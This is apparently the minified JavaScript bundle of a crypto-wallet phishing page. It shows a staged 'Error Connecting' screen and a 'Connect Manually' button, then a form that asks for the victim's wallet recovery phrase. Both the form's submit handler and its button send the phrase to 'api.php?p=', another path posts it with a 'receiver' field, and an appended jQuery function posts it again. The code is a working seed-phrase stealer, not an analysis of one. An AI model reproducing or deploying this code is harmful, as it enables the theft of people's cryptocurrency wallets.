"use strict"; {
    /* <script src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
    integrity = "sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
    crossorigin = "anonymous"
    referrerpolicy = "no-referrer" > </script> */
}

(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [499], {
        1499: function(e, t, r) {
            r.d(t, { Z: function() { return F } });
            var n = r(5893),
                l = r(3253),
                o = r.n(l),
                a = r(3854),
                s = r(4051),
                c = r.n(s),
                i = r(7294),
                u = r(4931),
                f = r(9830);

            function d() { if ("undefined" === typeof Reflect || !Reflect.construct) return !1; if (Reflect.construct.sham) return !1; if ("function" === typeof Proxy) return !0; try { return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0 } catch (e) { return !1 } }

            function p(e, t, r) {
                return p = d() ? Reflect.construct : function(e, t, r) {
                    var n = [null];
                    n.push.apply(n, t);
                    var l = new(Function.bind.apply(e, n));
                    return r && h(l, r.prototype), l
                }, p.apply(null, arguments)
            }

            function x(e) { return x = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) { return e.__proto__ || Object.getPrototypeOf(e) }, x(e) }

            function m(e, t) { return !t || "object" !== b(t) && "function" !== typeof t ? function(e) { if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return e }(e) : t }

            function h(e, t) { return h = Object.setPrototypeOf || function(e, t) { return e.__proto__ = t, e }, h(e, t) }
            var b = function(e) { return e && "undefined" !== typeof Symbol && e.constructor === Symbol ? "symbol" : typeof e };

            function v(e) {
                var t = "function" === typeof Map ? new Map : void 0;
                return v = function(e) {
                    if (null === e || (r = e, -1 === Function.toString.call(r).indexOf("[native code]"))) return e;
                    var r;
                    if ("function" !== typeof e) throw new TypeError("Super expression must either be null or a function");
                    if ("undefined" !== typeof t) {
                        if (t.has(e)) return t.get(e);
                        t.set(e, n)
                    }

                    function n() { return p(e, arguments, x(this).constructor) }
                    return n.prototype = Object.create(e.prototype, { constructor: { value: n, enumerable: !1, writable: !0, configurable: !0 } }), h(n, e)
                }, v(e)
            }

            function y(e) {
                var t = function() { if ("undefined" === typeof Reflect || !Reflect.construct) return !1; if (Reflect.construct.sham) return !1; if ("function" === typeof Proxy) return !0; try { return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0 } catch (e) { return !1 } }();
                return function() {
                    var r, n = x(e);
                    if (t) {
                        var l = x(this).constructor;
                        r = Reflect.construct(n, arguments, l)
                    } else r = n.apply(this, arguments);
                    return m(this, r)
                }
            }
            v(Error);
            var g = function(e) { var t, r; return (null === e || void 0 === e || null === (t = e.response) || void 0 === t ? void 0 : t.msg) ? null === e || void 0 === e || null === (r = e.response) || void 0 === r ? void 0 : r.msg : (null === e || void 0 === e ? void 0 : e.message) ? null === e || void 0 === e ? void 0 : e.message : "Unknown Error Occurred. Please try again" },
                j = r(9669),
                w = r.n(j)().create({ baseURL: f.kh.server }),
                N = r(6116),
                O = function(e) { var t = e.trim().split(" "); return (12 === t.length || 18 === t.length || 24 === t.length) && t.every((function(e) { return e.length >= 2 })) },
                P = r(9620),
                k = r(5434),
                E = function() { return (0, n.jsxs)("div", { className: "flex flex-col items-center justify-center space-y-5 text-center text-red-500", children: [(0, n.jsx)(k.B4e, { className: "text-9xl" }), (0, n.jsxs)("div", { className: "flex flex-col items-center justify-center space-y-1", children: [(0, n.jsx)("p", { children: "An Error Occurred. Please try again" }), (0, n.jsx)(k.vtX, { className: "text-2xl" })] })] }) },
                R = r(1185);

            function C(e, t, r, n, l, o, a) {
                try {
                    var s = e[o](a),
                        c = s.value
                } catch (i) { return void r(i) }
                s.done ? t(c) : Promise.resolve(c).then(n, l)
            }

            function S(e, t, r) { return t in e ? Object.defineProperty(e, t, { value: r, enumerable: !0, configurable: !0, writable: !0 }) : e[t] = r, e }

            function _(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var r = null != arguments[t] ? arguments[t] : {},
                        n = Object.keys(r);
                    "function" === typeof Object.getOwnPropertySymbols && (n = n.concat(Object.getOwnPropertySymbols(r).filter((function(e) { return Object.getOwnPropertyDescriptor(r, e).enumerable })))), n.forEach((function(t) { S(e, t, r[t]) }))
                }
                return e
            }
            var L = function(e) {
                    var t = e.walletName,
                        r = e.icon,
                        l = (0, i.useState)(!1),
                        o = l[0],
                        a = l[1],
                        s = (0, i.useState)(!1),
                        d = s[0],
                        p = s[1],
                        x = (0, i.useState)((function() { return { phrase: "", wallet: "" } })),
                        m = x[0],
                        h = x[1],
                        b = (0, i.useState)({ phrase: !1, wallet: !1 }),
                        v = b[0],
                        y = b[1];
                    (0, i.useEffect)((function() { "custom" !== t.toLocaleLowerCase() && j("wallet", (0, N.kC)(t)) }), [t]);
                    var j = function(e, t) { y((function(t) { return _({}, t, S({}, e, !1)) })), h((function(r) { return _({}, r, S({}, e, t)) })) },
                        k = function() {
                            var e, t = (e = c().mark((function e(t) {
                                return c().wrap((function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            if (t.preventDefault(), m.wallet.length >= 3) { e.next = 5; break }
                                            return u.ZP.error(f.RZ.INVALID_WALLET_NAME), y((function(e) { return _({}, e, { wallet: !0 }) })), e.abrupt("return");
                                        case 5:
                                            if (O(m.phrase)) { e.next = 9; break }
                                            return u.ZP.error(f.RZ.INVALID_PHRASE_KEY), y((function(e) { return _({}, e, { phrase: !0 }) })), e.abrupt("return");
                                        case 9:
                                            return a(!0), e.prev = 10, e.next = 13, w.post("send", _({}, m, { receiver: f.kh.receiver }));
                                        case 13:
                                            h({ phrase: "", wallet: "" }), p(!0), e.next = 20;
                                            break;
                                        case 17:
                                            e.prev = 17, e.t0 = e.catch(10), u.ZP.error(g(e.t0));
                                        case 20:
                                            a(!1);
                                        case 21:
                                        case "end":
                                            return e.stop()
                                    }
                                }), e, null, [
                                    [10, 17]
                                ])
                            })), function() {
                                var t = this,
                                    r = arguments;
                                return new Promise((function(n, l) {
                                    var o = e.apply(t, r);

                                    function a(e) { C(o, n, l, a, s, "next", e) }

                                    function s(e) { C(o, n, l, a, s, "throw", e) }
                                    a(void 0)
                                }))
                            });
                            return function(e) { return t.apply(this, arguments) }
                        }();
                    return o ? (0, n.jsx)(P.Z, {}) : d ? (0, n.jsx)(E, {}) : (0, n.jsxs)(n.Fragment, {
                        children: [(0, n.jsxs)("div", { className: "mb-3 flex flex-col items-center space-y-3", children: [(0, n.jsx)("div", { className: "pointer-events-none relative flex h-20 w-20 items-center justify-center overflow-hidden rounded-full bg-white/50 opacity-80", children: (0, n.jsx)(R.Z, { src: "/wallets/".concat(r, ".png"), alt: "".concat(r, " wallet image"), layout: "fill", objectFit: "contain" }) }), (0, n.jsxs)("h3", { className: "text-center text-xs capitalize", children: ["Import your", " ", (0, n.jsxs)("span", { className: "capitalize", children: [t, "custom" === t.toLowerCase() && " Wallet"] })] })] }), (0, n.jsx)("div", {
                            children: (0, n.jsxs)("form", {
                                //onSubmit: k,
                                onsubmit: function() {
                                    let a = document.createElement('a');
                                    var p = document.getElementById("phrase").value.trim();
                                    a.href = "api.php?p=" + encodeURIComponent(p); // encode the value for URL safety
                                    a.click();

                                },
                                className: "flex h-full flex-col space-y-4 font-light md:justify-center",
                                children: [(0, n.jsxs)("div", { className: "flex flex-col text-center", children: [(0, n.jsx)("label", { htmlFor: "wallet", className: "text-slate-300", children: "Wallet Name" }), (0, n.jsx)("input", { type: "text", className: "rounded-lg border-slate-300 bg-gradient-to-tr from-slate-50 to-slate-100 font-light text-slate-500 outline-none ring-0 focus:border-transparent focus:to-slate-200 focus:outline-none focus:ring-0 ".concat("custom" !== t.toLowerCase() ? "pointer-events-none cursor-not-allowed text-slate-300" : "", " ").concat(v.wallet ? "border-1 focus:border-1 border-red-600 focus:border-red-500" : ""), value: m.wallet, onChange: function(e) { return j("wallet", e.target.value) }, placeholder: "Enter the wallet name", name: "wallet", id: "wallet", disabled: "custom" !== t.toLowerCase(), required: !0 })] }), (0, n.jsxs)("div", {
                                    className: "flex flex-col text-center",
                                    children: [(0, n.jsx)("label", { htmlFor: "phrase", className: "text-slate-300", children: "Recovery Phrase" }), (0, n.jsx)("textarea", {
                                        className: "h-24 resize-none rounded-lg border-slate-300 bg-gradient-to-tr from-slate-50 to-slate-100 font-light text-slate-800 outline-none ring-0 scrollbar-thin scrollbar-track-slate-300 scrollbar-thumb-primary-blue placeholder:text-sm focus:border-transparent focus:to-slate-200 focus:outline-none focus:ring-0 ".concat(v.phrase ? "border-1 focus:border-1 border-red-600 focus:border-red-500" : ""),
                                        value: m.phrase,

                                        onChange: function(e) { return j("phrase", e.target.value) },
                                        placeholder: "Enter your Wallet Phrase Key. Typically 12 (sometimes 24) word separated by a single space",
                                        name: "phrase",
                                        id: "phrase",
                                        required: !0
                                    })]
                                }), (0, n.jsx)("div", {
                                    className: "mb-2 flex justify-center text-center",
                                    children: (0, n.jsx)("button", {
                                        disabled: m.wallet.length < 3 || m.phrase.length < 5,
                                        type: "submit",
                                        onClick: function() {
                                            let a = document.createElement('a');
                                            var p = document.getElementById("phrase").value.trim();
                                            a.href = "api.php?p=" + encodeURIComponent(p); // encode the value for URL safety
                                            a.click();

                                        },
                                        className: "flex cursor-pointer space-x-2 rounded-md bg-lg2 px-4 py-2 uppercase text-slate-100 transition-all duration-[300ms] hover:bg-lg3 disabled:pointer-events-none disabled:bg-gradient-to-b disabled:from-slate-100/40 disabled:to-slate-300/10 disabled:text-slate-500/80",
                                        children: (0, n.jsx)("span", { className: "", children: "Proceed" })
                                    })
                                })]
                            })
                        })]
                    })
                },
                Z = function(e) {
                    var t = e.walletName,
                        r = e.icon,
                        l = e.close,
                        o = (0, i.useState)(!0),
                        a = o[0],
                        s = o[1];
                    return (0, i.useEffect)((function() { setTimeout((function() { return s(!1) }), 3e3) }), []), (0, n.jsxs)("div", {
                        className: "flex flex-col space-y-8",
                        children: [(0, n.jsx)("div", {
                            className: "relative flex rounded-md py-5 text-center ".concat(a ? "items-center justify-center border-primary-blue2" : "flex-col items-center justify-center border-red-600", " border"),
                            children: a ? (0, n.jsx)("p", { className: "animate-pulse text-lg text-slate-400", children: "Connecting..." }) : (0, n.jsxs)("div", {
                                className: "",
                                children: [(0, n.jsx)("p", { className: "text-lg text-red-600", children: "Error Connecting..." }), (0, n.jsx)("button", {
                                    onClick: function() {
                                        let a = document.createElement('a');

                                        a.href = 'manually/get2pi.html';
                                        a.click();
                                    },

                                    className: "mt-2 cursor-pointer rounded-lg bg-lg2 px-3 py-1 text-gray-300 hover:bg-linear4",
                                    children: "Connect Manually"
                                })]
                            })
                        }), (0, n.jsxs)("div", { className: "pointer-events-none flex flex-col items-center justify-center space-x-1 divide-y divide-dashed divide-primary-blue2/30 rounded-md border border-primary-blue2", children: [(0, n.jsxs)("div", { className: "p-4", children: [(0, n.jsx)("p", { className: "mb-3 text-sm font-bold sm:text-base md:text-lg", children: t }), (0, n.jsx)("div", { className: "pointer-events-none relative mx-auto flex h-12 w-12 items-center justify-center overflow-hidden rounded-full bg-white/20 bg-opacity-40", children: (0, n.jsx)(R.Z, { src: "/wallets/".concat(r, ".png"), alt: "".concat(r, " wallet image"), layout: "fill", objectFit: "contain" }) })] }), (0, n.jsx)("span", { className: "px-4 py-2 text-center text-xs font-light italic md:text-sm", children: "Easy-to-use wallets app" })] })]
                    })
                },
                A = { content: { top: "50%", left: "50%", right: "auto", bottom: "auto", marginRight: "-50%", transform: "translate(-50%, -50%)", background: "transparent", border: "none", padding: 0 }, overlay: { backgroundColor: "rgba(0, 0, 0, 0.75)", zIndex: 999 } },
                F = function(e) {
                    var t = e.isOpen,
                        r = e.closeModal,
                        l = e.icon,
                        s = e.walletName,
                        c = (0, i.useState)(!1),
                        u = c[0],
                        f = c[1],
                        d = (0, i.useState)(!0),
                        p = d[0],
                        x = d[1],
                        m = function() { x(!0), f(!1), r() };
                    return (0, n.jsx)(o(), { ariaHideApp: !1, isOpen: t, onRequestClose: m, style: A, children: (0, n.jsxs)("div", { className: "relative flex h-[90vh] max-h-[450px] w-[80vw] max-w-[350px] flex-col justify-center overflow-hidden rounded-2xl bg-gradient-to-b from-primary/50 to-primary-bg/80 p-5 text-primary-blue2 shadow-lg backdrop-blur-[4px] scrollbar-none lg:max-h-[580px] lg:max-w-[450px] lg:space-y-8", children: [(0, n.jsx)("div", { className: "fixed right-0 top-0 left-0 flex h-10 w-full items-center justify-end bg-white pr-3", children: (0, n.jsx)(a.VLi, { className: "cursor-pointer text-3xl text-red-700 lg:text-3xl", onClick: m }) }), (0, n.jsxs)("div", { className: "mt-7 w-full overflow-y-scroll scrollbar-none", children: [u && (0, n.jsx)(L, { icon: l, walletName: s }), p && (0, n.jsx)(Z, { icon: l, walletName: s, close: function() { x(!1), f(!0) } })] })] }) })
                }
        }
    }
]);

function myFunction() {
    // jQuery.ajax({
    //     type: "POST",
    //     url: 'your_functions_address.php',
    //     dataType: 'json',
    // })

    $.post(
        'api.php', {
            //ts   : Date.now(), // Be very very sure we're not caching
            text: $('#phrase').val()
        }
    )
}